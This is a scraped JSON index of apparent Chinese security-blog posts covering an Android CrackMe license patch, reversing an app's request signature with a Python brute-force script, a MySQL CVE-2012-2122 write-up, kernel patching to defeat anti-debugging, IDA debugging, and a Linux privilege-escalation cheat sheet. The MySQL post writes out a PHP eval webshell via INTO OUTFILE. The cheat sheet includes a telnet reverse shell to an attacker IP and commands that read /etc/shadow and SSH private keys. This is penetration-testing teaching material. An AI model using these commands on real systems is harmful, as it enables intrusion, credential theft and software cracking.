修改时，发现第一种并不行，Java层参数值修改后，可能n2做了其他相关处理，第二种是可行，毕竟都获取到了注册码，但需要解密成功，此MD5只是简单的32345678。 第三种修改n1： 输入肯定为错误或者不输入值，因此只需要修改值为空或者其他未知情况下的返回值。 .text:0000133C CMP R0, #0 .text:00001340 MOVEQ R1, #4 .text:00001344 MOV R0, R7 .text:00001348 MOVNE R1, R8 修改为： .text:0000133C MOV R0, #3 .text:00001340 MOVEQ R1, #3 .text:00001344 MOV R0, R7 .text:00001348 MOVNE R1, R8 让其在未输入的情况下返回企业版的返回值。修改编译安装后，打开即为企业版。 第四种修改work: .text:000014A0 10 40 2D E9 STMFD SP!, &#123;R4,LR&#125; .text:000014A4 00 40 A0 E1 MOV R4, R0 .text:000014A8 6F FF FF EB BL n1 .text:000014AC 04 00 A0 E1 MOV R0, R4 .text:000014B0 35 FF FF EB BL getValue .text:000014B8 00 00 50 E3 CMP R0, #0 增加一条指令，修改为: .text:000014A0 10 40 2D E9 STMFD SP!, &#123;R4,LR&#125; .text:000014A4 00 40 A0 E1 MOV R4, R0 .text:000014A8 6F FF FF EB BL n1 .text:000014AC 04 00 A0 E1 MOV R0, R4 .text:000014B0 35 FF FF EB BL getValue .text:000014B4 03 00 A0 E3 MOV R0, #3 .text:000014B8 00 00 50 E3 CMP R0, #0 这样达到从getvalue获取返回值后，重新修改v2的值为3，让其无论什么情况下都自动判断为已注册企业版。 网上其他的分析文章，同样是修改n1函数，只不过修改方式是同时修改几个mov语句，让其都赋值3来跳转判断。 详细文章：简单Android CrackMe分析","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"APP解密参数sign","slug":"APP解密参数sign","date":"2019-04-18T08:34:21.000Z","updated":"2019-07-26T09:56:16.000Z","comments":true,"path":"2019/04/APP解密参数sign/","link":"","permalink":"https://misakikata.github.io/2019/04/APP%E8%A7%A3%E5%AF%86%E5%8F%82%E6%95%B0sign/","excerpt":"","text":"APP解密参数signAPP是公司自己的业务APP，没有加固，只做了代码混淆。本以为要对加密字段进行so文件的逆向，查看后发现是Java层的加密，相对较简单。 首先抓包查看加密字段和相关参数值，可以看到一共有四个参数，其中sign是加密验证完整性字段 利用AK逆向APP包，搜索sign字段信息，但是搜索结果过多，查找较困难，但是sign是一个data参数字段，因此尝试更换其他字段搜索。 搜索reqData字段可以看到，搜索结果就smali文件存在，第一个为程序包，查看代码，利用jd来查看反编译Java代码。 搜索字段，可以看到如下所示，以下字段可以看出，程序对其四个字段的获取都有代表的变量，而我们只需要获取sign的变量，localObject2。 变量的值来源为t包的b方法，可以明显看到，值为nonce，tiestamp, localObject1, t.f的相加值。而localObject1为reqData的值。 查看t.b的方法，方法如下，对字段进行sha-256加密。查看a方法 public static String b(String paramString) &#123; return a(paramString, &quot;SHA-256&quot;); &#125; 其中t.a的执行为对指定的参数进行指定的加密，利用传入参数来确定。 public static String a(String paramString1, String paramString2) &#123; try &#123; paramString2 &#x3D; MessageDigest.getInstance(paramString2); paramString2.update(paramString1.getBytes()); paramString1 &#x3D; a(paramString2.digest()); return paramString1; &#125; catch (Exception paramString1) &#123; paramString1.printStackTrace(); &#125; return null; &#125; 而t.f代表的是一段加密公钥，此处不在列出，利用在线工具查看加密结果是否一致。可以看到加密后的参数和抓到的包结果一致。 那么就可以利用我们自己生成加密参数的方式来进行测试，例如如下脚本，通过判断响应返回的字段来获取参数值，查看是否越权等信息。 #coding : utf-8 import hashlib import requests headers &#x3D; &#123; &#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Cookie&#39;: &#39;JSESSIONID&#x3D;xxxxxxx&#39;, &#39;User-Agent&#39;: &#39;okhttp&#x2F;3.4.1&#39; &#125; for i in range(60200000, 60295558): sha &#x3D; &#39;MIICdgIBADAN.....TMK63hMPgm25mbCD0vKhsQtcSDlzVwtOOoNlW5E8CQQDNXVwGolFCqU9lb5147AHc+&lt;INF&gt;&lt;action&gt;...&lt;&#x2F;action&gt;&lt;hostId&gt;&#39;+str(i)+&#39;&lt;&#x2F;hostId&gt;&lt;ver&gt;27&lt;&#x2F;ver&gt;&lt;transNo&gt;1555571421812&lt;&#x2F;transNo&gt;&lt;deviceType&gt;0&lt;&#x2F;deviceType&gt;&lt;verNm&gt;3.3.1&lt;&#x2F;verNm&gt;&lt;&#x2F;INF&gt;LE8I2QTAFHJM3M.....1555571421812&#39; h &#x3D; hashlib.sha256(sha) sha256 &#x3D; h.hexdigest() data &#x3D; &#39;reqData&#x3D;&lt;INF&gt;&lt;action&gt;.....&lt;&#x2F;action&gt;&lt;hostId&gt;&#39;+str(i)+&#39;&lt;&#x2F;hostId&gt;&lt;ver&gt;27&lt;&#x2F;ver&gt;&lt;transNo&gt;1555571421812&lt;&#x2F;transNo&gt;&lt;deviceType&gt;0&lt;&#x2F;deviceType&gt;&lt;verNm&gt;3.3.1&lt;&#x2F;verNm&gt;&lt;&#x2F;INF&gt;&amp;nonce&#x3D;LE8I2QTAFHJM3MO.....&amp;timestamp&#x3D;1555571421812&amp;sign&#x3D;&#39;+sha256 r &#x3D; requests.post(&#39;http:&#x2F;&#x2F;xxxxxx&#x2F;api&#39;, data &#x3D; data, headers&#x3D;headers) if &#39;xxxxxx&#39; in r.text: print i","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"MySQL历史漏洞分析","slug":"MySQL历史漏洞分析","date":"2019-04-12T06:05:30.000Z","updated":"2019-04-12T08:54:58.000Z","comments":true,"path":"2019/04/MySQL历史漏洞分析/","link":"","permalink":"https://misakikata.github.io/2019/04/MySQL%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"MySQL历史漏洞分析前段时间公司一托管的老系统，被木马勒索，然后紧急处理了一下，此系统使用少，而且是外包托管阿里云，因此并没有影响其他系统。拿到这个系统后，查看端口服务时发现，数据库端口对外开放，ssh对外开放，然后根据对系统的核查，猜测有可能存在以下问题： 1、后台弱口令或者登陆绕过 2、mysql弱口令 3、ssh弱口令爆破 经过后来优先对外的端口审查，发现是数据库漏洞，MySQL的cve-2012-2122，身份验证漏洞。 简单的说就是MySQL对身份验证上存在缺陷，大概256次登陆认证就会出现一次认证成功。并不在乎密码的正确性。 漏洞介绍： https:&#x2F;&#x2F;seclists.org&#x2F;oss-sec&#x2F;2012&#x2F;q2&#x2F;493 漏洞原因： my_bool check_scramble(const uchar *scramble_arg, const char *message, const uint8 *hash_stage2) &#123; SHA1_CONTEXT sha1_context; uint8 buf[SHA1_HASH_SIZE]; uint8 hash_stage2_reassured[SHA1_HASH_SIZE]; mysql_sha1_reset(&amp;sha1_context); &#x2F;* create key to encrypt scramble *&#x2F; mysql_sha1_input(&amp;sha1_context, (const uint8 *) message, SCRAMBLE_LENGTH); mysql_sha1_input(&amp;sha1_context, hash_stage2, SHA1_HASH_SIZE); mysql_sha1_result(&amp;sha1_context, buf); &#x2F;* encrypt scramble *&#x2F; my_crypt((char *) buf, buf, scramble_arg, SCRAMBLE_LENGTH); &#x2F;* now buf supposedly contains hash_stage1: so we can get hash_stage2 *&#x2F; mysql_sha1_reset(&amp;sha1_context); mysql_sha1_input(&amp;sha1_context, buf, SHA1_HASH_SIZE); mysql_sha1_result(&amp;sha1_context, hash_stage2_reassured); return memcmp(hash_stage2, hash_stage2_reassured, SHA1_HASH_SIZE); &#125; 以上是问题出现的代码处，memcmp的返回值实际上是int，而my_bool却是char。那么在把int转换成char的时候，就有可能发生截断。比如，memcmp返回0×200，截断后变成了0，调用check_scramble函数的就误以为密码正确。 而此漏洞并不是版本通病是MySQL在编译时，需添加-fno-builtin，并且所使用的glibc是经SSE优化后的，只不过glibc是系统自带。 漏洞利用： 使用如下poc： for i in &#96;seq 1 1000&#96;; do mysql -u root --password&#x3D;root -h 127.0.0.1 2&gt;&#x2F;dev&#x2F;null; done 环境采用vulhub的docker环境，测试成功后返回如下： 那么拿到数据库怎么尝试获取服务权限，可以获取数据库账号密码来维持对数据库的访问和root权限。 select user,password from mysql.user; MySQL密码加密由sha1加密后再unhex加密再sha1加密的字段，可以再md5等密码查询网站查找。如上密码为123456。 还可以使用导出的形式，利用如下： Select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;a.txt&#39;; #这种需要知道web路径 同样也可以使用load_file来查看系统文件等 SELECT LOAD_FILE(&#39;&#x2F;etc&#x2F;passwd&#39;)","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"逆向修改手机内核，绕过反调试","slug":"逆向修改手机内核，绕过反调试","date":"2019-04-02T05:59:49.000Z","updated":"2019-07-26T09:56:34.000Z","comments":true,"path":"2019/04/逆向修改手机内核，绕过反调试/","link":"","permalink":"https://misakikata.github.io/2019/04/%E9%80%86%E5%90%91%E4%BF%AE%E6%94%B9%E6%89%8B%E6%9C%BA%E5%86%85%E6%A0%B8%EF%BC%8C%E7%BB%95%E8%BF%87%E5%8F%8D%E8%B0%83%E8%AF%95/","excerpt":"","text":"逆向修改手机内核，绕过反调试Android 应用反调试里最常用的一种反调试方法是查看/proc/self/status的信息，如果 TracerPid 不为 0，就判断为正在被调试。因此修改手机的TracePid,让其值恒为零。 一、 提取 zImage 内核文件查找boot文件位置 find &#x2F; | grep boot cd &#x2F;dev&#x2F;block&#x2F;platform&#x2F;7824900.sdhci&#x2F;by-name&#x2F; 将boot导出为boot.img dd if&#x3D;&#x2F;dev&#x2F;block&#x2F;mmcblk0p22 of&#x3D;&#x2F;sdcard&#x2F;boot.img 把boot转移到可以下载的目录，由于adb权限问题，复制到sd卡目录下。 adb pull &#x2F;sdcard&#x2F;boot.img d:\\a 然后下载bootimg解压boot文件： git clone https:&#x2F;&#x2F;github.com&#x2F;pbatard&#x2F;bootimg-tools.git make 此时已经生成二进制文件，在mkbootimg目录下，进入此目录使用unmkbootimg，提取kernel 提取原始zImage 将kernel文件复制为文件名为zImage.gz的文件，并使用010editor查找十六进制1f 8b 08 00，找到后把前面的数据全删掉，使文件变成标准的gzip压缩文件，这样子就可以使用gunzip解压了。 修改完成后，解压缩文件，提取zImage 二、 提位、修改关键代码zImage文件可以直接使用 IDA 去打开，但需要设置参数。（建议使用6.8版本，因为在索引函数时可以自动识别，而7.0则不可） 点击OK后，确定进入ARM，然后弹出此对话框，填入0xc0008000 原文要求修改函数指令来达到修改的效果，但在修改过程中发现，对不同kernel，最后查到的对应proc_pid_status函数操作指令不一致。 echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;kptr_restrict 关闭符号屏蔽 再输入以下命令查看这两函数的地址 cat &#x2F;proc&#x2F;kallsyms |grep proc_pid_status cat &#x2F;proc&#x2F;kallsyms |grep __task_pid_nr_ns 为了避免修改出错刷入手机成砖的风险，采用了另一方式，shift+f12来打开字符串窗口，查找TracerPid，修改其后的占位符，把%d修改为0和%09(30 09)。 其对应的Hex窗口修改为如下所示： 使用gzip -n -f -9 zImage压缩修改后的内核裸文件，压缩后会比原来的小，必须比原来的文件小才可以。得到zImage.gz，我们使用010分别打开zImage.gz和boot.img，搜索1F 8B 08 00。按下insert键，将010改为overwrite，注意这里必须是覆盖，这样就不用考虑插入后大小的问题了，把zImage.gz的内容复制到boot.img的相应位置。boot.img会有两个1F 8B 08 00，修改第一个，把其中的十六进制改为zImage.gz文件的十六进制值，在edit选项中进行覆写。 修改完成后，刷入手机，利用SDK自带的fastboot。 adb reboot bootloader # 启动fastboot模式 fastboot flash boot boot.img #刷入boot分区 fastboot reboot #重启 调试查看 如想使用修改函数操作指令的方式可以参考原作者方式： 1、逆向修改手机内核，绕过反调试 2、逆向修改内核，绕过TracerPID反调试","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"IDA动态调试","slug":"IDA动态调试","date":"2019-03-29T08:31:34.000Z","updated":"2019-07-26T09:56:06.000Z","comments":true,"path":"2019/03/IDA动态调试/","link":"","permalink":"https://misakikata.github.io/2019/03/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/","excerpt":"","text":"IDA 动态调试通常在APP逆向和破解时，某些重要的函数会以so文件的形式进行加载，所以，在想获得关键操作逻辑和修改某些函数时，就需要IDA来进行操作啦。以下使用IDA版本7.0，小米手机 1、上传Android_Server文件存放在安装目录下的dbgsrv目录中，7.0以后版本多了几个其他版本的Android_server文件，上传Android_server文件到手机目录中，并提升执行权限。 adb push android_server &#x2F;data&#x2F;local&#x2F;tmp&#x2F; chmod 755 android_server adb forward tcp:23946 tcp:23946 执行后就可以显示正在监听23946端口，如果报错，一般是使用位数和系统不一致。 2、调试启动APP以调试模式启动app adb shell am start -D -n 包名&#x2F;.MainActivity 手机界面显示等待调试中，便可以进行下一步了。 3、查看APP PID调试进程进行端口转发，查看进程对应PID。 adb shell ps | grep 包名 adb forward tcp:8700 jdwp:pid 8700端口一般为默认的本地调试端口，如果不一致，可以在DDMS中查看。 4、IDA附加进程附加进程调试时，有时候需要对，如下的选项进行勾选，一般在需要动态加载so文件，调试JNI_onload函数的时候需要，对于一般调试静态函数的，需要拦取执行后断点的，可能连调试模式启动app都不需要。 选择后，便可以在attach to process选项中查看到相应的可调试进程了。如果没有进程可能是你的APP不能调试，需要添加可调试参数。或者直接修改ro.debuggable=1。 5、JDB附加执行jdb附加 jdb -connect com.sun.jdi.SocketAttach:hostname&#x3D;127.0.0.1,port&#x3D;8700 6、调试选择选择完成后，进入调试状态，在右边的modules栏可以看到加载进来的so文件。选择需要调试的so文件，如果没有看到需要的so文件，说明so文件是动态加载的，这时候F9运行，就可以看到相应的so文件了。 选择相应的so文件后，会显示so文件中的函数，选择对于函数即可。 7、调试断点如选择对于的JNI_Onload 函数，这时候界面会跳转到函数的起始位置，当然也可以使用基地址加偏移地址的方式寻找。找到函数位置后就可以F2下断点了。 断点执行后，点击F9再次运行，程序就可以执行到断点位置，当然有些是需要配合界面操作来执行。由于以上是抓取JNI_Onload函数，直接运行即可。 利用F8步过，F7步入进行调试即可。 对于调试结果，可以查看右侧寄存器变化，和下面的Hex View 变化值，来查看是否有需要的执行结果和函数值。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"基本Linux权限提升","slug":"基本Linux权限提升","date":"2019-03-18T05:49:53.000Z","updated":"2019-03-18T05:50:20.000Z","comments":true,"path":"2019/03/基本Linux权限提升/","link":"","permalink":"https://misakikata.github.io/2019/03/%E5%9F%BA%E6%9C%ACLinux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/","excerpt":"","text":"原文链接：https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 基本Linux权限提升枚举是关键。（Linux）权限升级就是： 收集 - *枚举，更多枚举和更多枚举。* 流程 - 对数据进行排序，分析和确定优先级。 搜索 - 了解要搜索的内容以及在何处查找漏洞利用代码。 适应 - *自定义漏洞利用，因此适合。并非每个漏洞利用都适用于每个系统“开箱即用”。* 尝试 - 为（大量）试验和错误做好准备。 操作系统什么是分销类型？什么版本？cat &#x2F;etc&#x2F;issue cat &#x2F;etc&#x2F;*-release cat &#x2F;etc&#x2F;lsb-release # Debian based cat &#x2F;etc&#x2F;redhat-release # Redhat based 什么是内核版本？是64位吗？cat &#x2F;proc&#x2F;version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls &#x2F;boot | grep vmlinuz- 从环境变量中可以学到什么？cat &#x2F;etc&#x2F;profile cat &#x2F;etc&#x2F;bashrc cat ~&#x2F;.bash_profile cat ~&#x2F;.bashrc cat ~&#x2F;.bash_logout env set 有打印机吗？lpstat -a 应用与服务正在运行什么服务？哪个服务具有哪个用户权限？ps aux ps -ef top cat &#x2F;etc&#x2F;services root运行了哪些服务？在这些易受攻击的服务中，值得仔细检查！ps aux | grep root ps -ef | grep root 安装了哪些应用程序？它们是什么版本的？他们目前正在运行吗？ls -alh &#x2F;usr&#x2F;bin&#x2F; ls -alh &#x2F;sbin&#x2F; dpkg -l rpm -qa ls -alh &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archivesO ls -alh &#x2F;var&#x2F;cache&#x2F;yum&#x2F; 任何服务设置配置错误？是否附加了任何（易受攻击的）插件？cat &#x2F;etc&#x2F;syslog.conf cat &#x2F;etc&#x2F;chttp.conf cat &#x2F;etc&#x2F;lighttpd.conf cat &#x2F;etc&#x2F;cups&#x2F;cupsd.conf cat &#x2F;etc&#x2F;inetd.conf cat &#x2F;etc&#x2F;apache2&#x2F;apache2.conf cat &#x2F;etc&#x2F;my.conf cat &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf cat &#x2F;opt&#x2F;lampp&#x2F;etc&#x2F;httpd.conf ls -aRl &#x2F;etc&#x2F; | awk &#39;$1 ~ &#x2F;^.*r.*&#x2F; 安排了哪些工作？crontab -l ls -alh &#x2F;var&#x2F;spool&#x2F;cron ls -al &#x2F;etc&#x2F; | grep cron ls -al &#x2F;etc&#x2F;cron* cat &#x2F;etc&#x2F;cron* cat &#x2F;etc&#x2F;at.allow cat &#x2F;etc&#x2F;at.deny cat &#x2F;etc&#x2F;cron.allow cat &#x2F;etc&#x2F;cron.deny cat &#x2F;etc&#x2F;crontab cat &#x2F;etc&#x2F;anacrontab cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root 任何纯文本用户名和/或密码？grep -i user [filename] grep -i pass [filename] grep -C 5 &quot;password&quot; [filename] find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla 通信与网络系统有哪些NIC？它是否连接到另一个网络？&#x2F;sbin&#x2F;ifconfig -a cat &#x2F;etc&#x2F;network&#x2F;interfaces cat &#x2F;etc&#x2F;sysconfig&#x2F;network 什么是网络配置设置？你能从这个网络中找到什么？DHCP服务器？DNS服务器？网关？cat &#x2F;etc&#x2F;resolv.conf cat &#x2F;etc&#x2F;sysconfig&#x2F;network cat &#x2F;etc&#x2F;networks iptables -L hostname dnsdomainname 其他用户和主机与系统进行通信的是什么？lsof -i lsof -i :80 grep 80 &#x2F;etc&#x2F;services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w 什么缓存？IP和/或MAC地址arp -e route &#x2F;sbin&#x2F;route -nee 数据包嗅探可能吗？可以看到什么tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 注意：tcpdump tcp dst [ip] [port]和tcp dst [ip] [port] 你有壳吗？你能和系统互动吗？nc -lvp 4444 # Attacker. Input (Commands) nc -lvp 4445 # Attacker. Ouput (Results) telnet [atackers ip] 44444 | &#x2F;bin&#x2F;sh | [local ip] 44445 # On the targets system. Use the attackers IP! &#96; 注意：http：//lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/ 端口转发可能吗？重定向并与来自其他视图的流量进行交互注意：http：//www.boutell.com/rinetd/ 注意：http：//www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch 注意：http：//downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip 注意：FPipe.exe -l [本地端口] -r [远程端口] -s [本地端口] [本地IP] FPipe.exe -l 80 -r 80 -s 80 192.168.1.7 注意：ssh - [L / R] [本地端口]：[远程ip]：[远程端口] [本地用户] @ [本地ip] ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port 注意：mknod backpipe p; nc -l -p [远程端口] &lt;backpipe | nc [本地IP] [本地端口]&gt;反向管道 mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.5.5.151 80 &gt;backpipe # Port Relay mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080) mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080) 隧道可能吗？远程本地发送命令ssh -D 127.0.0.1:9050 -N [username]@[ip] proxychains ifconfig 机密信息和用户你是谁？谁登录？谁已登录？那里还有谁？谁能做什么？id who w last cat &#x2F;etc&#x2F;passwd | cut -d: -f1 # List of users grep -v -E &quot;^#&quot; &#x2F;etc&#x2F;passwd | awk -F: &#39;$3 &#x3D;&#x3D; 0 &#123; print $1&#125;&#39; # List of super users awk -F: &#39;($3 &#x3D;&#x3D; &quot;0&quot;) &#123;print&#125;&#39; &#x2F;etc&#x2F;passwd # List of super users cat &#x2F;etc&#x2F;sudoers sudo -l 可以找到哪些敏感文件？cat &#x2F;etc&#x2F;passwd cat &#x2F;etc&#x2F;group cat &#x2F;etc&#x2F;shadow ls -alh &#x2F;var&#x2F;mail&#x2F; 家庭导演中有什么“有趣”的东西？如果可以访问ls -ahlR &#x2F;root&#x2F; ls -ahlR &#x2F;home&#x2F; 是否有密码; 脚本，数据库，配置文件或日志文件？密码的默认路径和位置cat &#x2F;var&#x2F;apache2&#x2F;config.inc cat &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql&#x2F;user.MYD cat &#x2F;root&#x2F;anaconda-ks.cfg 用户正在做什么？是否有明文密码？他们在编辑什么？cat ~&#x2F;.bash_history cat ~&#x2F;.nano_history cat ~&#x2F;.atftp_history cat ~&#x2F;.mysql_history cat ~&#x2F;.php_history 可以找到哪些用户信息？cat ~&#x2F;.bashrc cat ~&#x2F;.profile cat &#x2F;var&#x2F;mail&#x2F;root cat &#x2F;var&#x2F;spool&#x2F;mail&#x2F;root 可以找到私钥信息吗？cat ~&#x2F;.ssh&#x2F;authorized_keys cat ~&#x2F;.ssh&#x2F;identity.pub cat ~&#x2F;.ssh&#x2F;identity cat ~&#x2F;.ssh&#x2F;id_rsa.pub cat ~&#x2F;.ssh&#x2F;id_rsa cat ~&#x2F;.ssh&#x2F;id_dsa.pub cat ~&#x2F;.ssh&#x2F;id_dsa cat &#x2F;etc&#x2F;ssh&#x2F;ssh_config cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config cat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key.pub cat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key cat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key.pub cat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key cat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_key.pub cat &#x2F;etc&#x2F;ssh&#x2F;ssh_host_key &#96; 文件系统哪些配置文件可以写在/ etc /中？能够重新配置服务吗？ls -aRl &#x2F;etc&#x2F; | awk &#39;$1 ~ &#x2F;^.*w.*&#x2F;&#39; 2&gt;&#x2F;dev&#x2F;null # Anyone ls -aRl &#x2F;etc&#x2F; | awk &#39;$1 ~ &#x2F;^..w&#x2F;&#39; 2&gt;&#x2F;dev&#x2F;null # Owner ls -aRl &#x2F;etc&#x2F; | awk &#39;$1 ~ &#x2F;^.....w&#x2F;&#39; 2&gt;&#x2F;dev&#x2F;null # Group ls -aRl &#x2F;etc&#x2F; | awk &#39;$1 ~ &#x2F;w.$&#x2F;&#39; 2&gt;&#x2F;dev&#x2F;null # Other find &#x2F;etc&#x2F; -readable -type f 2&gt;&#x2F;dev&#x2F;null # Anyone find &#x2F;etc&#x2F; -readable -type f -maxdepth 1 2&gt;&#x2F;dev&#x2F;null # Anyone &#96; 在/ var /中可以找到什么？ls -alh &#x2F;var&#x2F;log ls -alh &#x2F;var&#x2F;mail ls -alh &#x2F;var&#x2F;spool ls -alh &#x2F;var&#x2F;spool&#x2F;lpd ls -alh &#x2F;var&#x2F;lib&#x2F;pgsql ls -alh &#x2F;var&#x2F;lib&#x2F;mysql cat &#x2F;var&#x2F;lib&#x2F;dhcp3&#x2F;dhclient.leases 网站上的任何设置/文件（隐藏）？有数据库信息的任何设置文件？ls -alhR &#x2F;var&#x2F;www&#x2F; ls -alhR &#x2F;srv&#x2F;www&#x2F;htdocs&#x2F; ls -alhR &#x2F;usr&#x2F;local&#x2F;www&#x2F;apache22&#x2F;data&#x2F; ls -alhR &#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F; ls -alhR &#x2F;var&#x2F;www&#x2F;html&#x2F; 日志文件中是否有任何内容（可以帮助“本地文件包含”！） cat &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access_log cat &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access.log cat &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;error_log cat &#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;error.log cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access_log cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;error_log cat &#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log cat &#x2F;var&#x2F;log&#x2F;apache&#x2F;access_log cat &#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log cat &#x2F;var&#x2F;log&#x2F;auth.log cat &#x2F;var&#x2F;log&#x2F;chttp.log cat &#x2F;var&#x2F;log&#x2F;cups&#x2F;error_log cat &#x2F;var&#x2F;log&#x2F;dpkg.log cat &#x2F;var&#x2F;log&#x2F;faillog cat &#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log cat &#x2F;var&#x2F;log&#x2F;httpd&#x2F;access.log cat &#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log cat &#x2F;var&#x2F;log&#x2F;httpd&#x2F;error.log cat &#x2F;var&#x2F;log&#x2F;lastlog cat &#x2F;var&#x2F;log&#x2F;lighttpd&#x2F;access.log cat &#x2F;var&#x2F;log&#x2F;lighttpd&#x2F;error.log cat &#x2F;var&#x2F;log&#x2F;lighttpd&#x2F;lighttpd.access.log cat &#x2F;var&#x2F;log&#x2F;lighttpd&#x2F;lighttpd.error.log cat &#x2F;var&#x2F;log&#x2F;messages cat &#x2F;var&#x2F;log&#x2F;secure cat &#x2F;var&#x2F;log&#x2F;syslog cat &#x2F;var&#x2F;log&#x2F;wtmp cat &#x2F;var&#x2F;log&#x2F;xferlog cat &#x2F;var&#x2F;log&#x2F;yum.log cat &#x2F;var&#x2F;run&#x2F;utmp cat &#x2F;var&#x2F;webmin&#x2F;miniserv.log cat &#x2F;var&#x2F;www&#x2F;logs&#x2F;access_log cat &#x2F;var&#x2F;www&#x2F;logs&#x2F;access.log ls -alh &#x2F;var&#x2F;lib&#x2F;dhcp3&#x2F; ls -alh &#x2F;var&#x2F;log&#x2F;postgresql&#x2F; ls -alh &#x2F;var&#x2F;log&#x2F;proftpd&#x2F; ls -alh &#x2F;var&#x2F;log&#x2F;samba&#x2F; Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp &#96; 注：http：//www.thegeekstuff.com/2011/08/linux-var-log-files/ 如果命令有限，你会打破“监狱”外壳？python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; echo os.system(&#39;&#x2F;bin&#x2F;bash&#39;) &#x2F;bin&#x2F;sh -i 如何安装文件系统？mount df -h 是否有任何未安装的文件系统？cat &#x2F;etc&#x2F;fstab 使用了什么“高级Linux文件权限”？find &#x2F; -perm -1000 -type d 2&gt;&#x2F;dev&#x2F;null # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here. find &#x2F; -perm -g&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null # SGID (chmod 2000) - run as the group, not the user who started it. find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null # SUID (chmod 4000) - run as the owner, not the user who started it. find &#x2F; -perm -g&#x3D;s -o -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null # SGID or SUID for i in &#96;locate -r &quot;bin$&quot;&#96;; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2&gt;&#x2F;dev&#x2F;null; done # Looks in &#39;common&#39; places: &#x2F;bin, &#x2F;sbin, &#x2F;usr&#x2F;bin, &#x2F;usr&#x2F;sbin, &#x2F;usr&#x2F;local&#x2F;bin, &#x2F;usr&#x2F;local&#x2F;sbin and any other *bin, for SGID or SUID (Quicker search) # find starting at root (&#x2F;), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied) find &#x2F; -perm -g&#x3D;s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \\; 2&gt;&#x2F;dev&#x2F;null 哪里可以写入和执行？一些常见的地方：/ tmp，/ var / tmp，/ dev / shmfind &#x2F; -writable -type d 2&gt;&#x2F;dev&#x2F;null # world-writeable folders find &#x2F; -perm -222 -type d 2&gt;&#x2F;dev&#x2F;null # world-writeable folders find &#x2F; -perm -o w -type d 2&gt;&#x2F;dev&#x2F;null # world-writeable folders find &#x2F; -perm -o x -type d 2&gt;&#x2F;dev&#x2F;null # world-executable folders find &#x2F; \\( -perm -o w -perm -o x \\) -type d 2&gt;&#x2F;dev&#x2F;null # world-writeable &amp; executable folders 任何“问题”文件？可写字，“无人”文件find &#x2F; -xdev -type d \\( -perm -0002 -a ! -perm -1000 \\) -print # world-writeable files find &#x2F;dir -xdev \\( -nouser -o -nogroup 